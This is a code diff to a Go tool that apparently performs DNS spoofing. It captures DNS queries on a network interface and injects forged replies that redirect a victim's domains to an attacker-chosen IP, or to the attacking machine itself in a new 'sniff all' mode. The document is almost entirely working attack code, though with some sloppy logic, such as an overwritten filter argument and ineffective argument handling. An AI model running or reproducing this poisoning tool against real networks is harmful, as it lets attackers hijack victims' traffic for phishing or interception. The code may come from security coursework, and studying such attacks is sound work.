@@ -48,9 +48,22 @@ func stringInSlice(a string, list []string) bool {
     return false
 }
 
+func removeItemAtIndexI(index int, array [] string){
+	array[index] = array[len(array)-1]
+	array[len(array)-1] = ""
+	array = array[:len(array)-1]  
+}
 
-func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[string]string){
+func sniffTraffic(interfaceName string, bpfFilter string, attacker map[string]string, snifAll bool){
 	
+	var attackerIp string
+	if(snifAll == true){
+		conn, _ := net.Dial("udp", "8.8.8.8:80")
+     	defer conn.Close()
+     	attackerIp = conn.LocalAddr().(*net.UDPAddr).String()
+     	attackerIp = strings.Split(attackerIp, ":")[0]
+	}
+
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Fatal(err)
@@ -58,15 +71,16 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[str
 
 	intface = devices[0].Name
 
-	// Open device
-	handle, err = pcap.OpenLive(intface, snapshot_len, promiscuous, timeout)
+	handle, err = pcap.OpenLive(intface, 1024, true, 1 * time.Second)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer handle.Close()
 
 	//Setting BPF Filter
+	bpfFilter = "udp"
 	if bpfFilter != "nil" {
+		fmt.Println(bpfFilter)
 		err = handle.SetBPFFilter(bpfFilter)
 		if err != nil {
 			fmt.Printf("---- Please enter BPF filter in accurate BPF syntax ----\n")
@@ -100,16 +114,17 @@ func captureLiveTraffic(interfaceName string, bpfFilter string, attacker map[str
 					DnsServerIP = ip4.DstIP.String()
 				case layers.LayerTypeDNS:
 					dnsId := int(dns.ID)
-					
 					for _, dnsQuestion := range dns.Questions {
 						domain := string(dnsQuestion.Name)
-						if(stringInSlice(domain, hostnames)){
+						if(snifAll == true){
+							sendDnsPacket(dnsId, VicIP, VicPort, DnsServerIP, domain, attackerIp)
+						} else if(snifAll == false && stringInSlice(domain, hostnames)){
 							sendDnsPacket(dnsId, VicIP, VicPort, DnsServerIP, domain, attacker[domain])
 						}
 					}
-				}
 			}
 		}
+	}
 }
 
 func sendDnsPacket(dnsId int, vicIp string, vicPort string, orgDnsServerIp string, domain_name string, attacker_ip string){	
@@ -200,34 +215,63 @@ func sendDnsPacket(dnsId int, vicIp string, vicPort string, orgDnsServerIp strin
 
 func main(){
 	commandLineArgs := os.Args
-	if len(commandLineArgs) == 0 {
+	filename := ""
+	interfaceName := "any"
+	expression := "udp"
+
+	if len(commandLineArgs) < 0 {
 		fmt.Println("Usage:\nsudo go run [-i interface] [-r pcap] [-f filename]")
 		fmt.Println("-i flag expects interface name")
-		fmt.Println("-r flag expects pcap name")
 		fmt.Println("-f flag expects filename")
 	} else {
-		data, err := ioutil.ReadFile("poisonhosts")
-  		if err != nil {
-    		fmt.Println("File reading error", err)
-    		return
-  		}
-  		lines := strings.Split(string(data), "\n")
-  		
-  		attacker := make(map[string]string)
-  		for index, element := range lines {
-    		_ = index
-    		hostname_and_attackerip := strings.Fields(element)
-    		if len(hostname_and_attackerip) == 0{
-    			break
+		var indices []int
+		indices = append(indices, 0)
+		for i, _ := range commandLineArgs {
+
+			if(commandLineArgs[i] == "-f"){
+				filename = commandLineArgs[i+1]
+				indices = append(indices, i)
+				indices = append(indices, i + 1)
+			}
+			if(commandLineArgs[i] == "-i"){
+				interfaceName = commandLineArgs[i+1]
+				indices = append(indices, i)
+				indices = append(indices, i + 1)
+			}
+		}
+
+		for _, val := range indices {
+			removeItemAtIndexI(val, commandLineArgs)
+		}
+
+		if(len(commandLineArgs) > 1){
+			expression = commandLineArgs[1]
+		}
+
+		attacker := make(map[string]string)
+		if(filename != ""){
+			data, err := ioutil.ReadFile(filename)
+  			if err != nil {
+    			fmt.Println("File reading error", err)
+    			return
+  			}
+  			lines := strings.Split(string(data), "\n")
+  			fmt.Println(fmt.Sprintf("READING CONTENTS OF FILE: %s", filename))
+  			for index, element := range lines {
+    			_ = index
+    			hostname_and_attackerip := strings.Fields(element)
+    			if len(hostname_and_attackerip) == 0{
+    				break
+    			}
+    			attacker_ip := hostname_and_attackerip[0]
+    			hostname := hostname_and_attackerip[1]
+    			attacker[hostname] = attacker_ip
     		}
-    		attacker_ip := hostname_and_attackerip[0]
-    		hostname := hostname_and_attackerip[1]
-    		attacker[hostname] = attacker_ip
-    	}
+			fmt.Println(attacker)
+			sniffTraffic(interfaceName, expression, attacker, false)
+		} else {
+			sniffTraffic(interfaceName, expression, attacker, true)
+		}
 		
-		interfaceName := "any"
-		bpfFilter := "udp"
-		fmt.Println(attacker)
-		captureLiveTraffic(interfaceName, bpfFilter, attacker)
 	}
 }
